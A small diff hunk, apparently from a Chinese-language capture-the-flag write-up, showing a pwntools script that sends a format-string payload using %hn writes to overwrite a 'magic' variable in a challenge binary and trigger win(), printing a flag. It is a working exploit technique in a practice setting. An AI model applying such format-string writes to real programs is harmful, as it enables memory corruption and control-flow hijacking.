@@ -115,7 +115,7 @@ io=process("./chal1")
 magic=elf.sym["magic"]
 payload=b"%4919c%10$hn%43960c%11$hn".ljust(32,b"A")+p64(magic+2)+p64(magic)
 io.send(payload)
-print(io.recvall().decode(errors="ignore"))
+print(io.recvall())
 ```
 
 运行后程序输出大量空格并触发 `win()`，打印出 `flag{fmt_str_write_success}`。
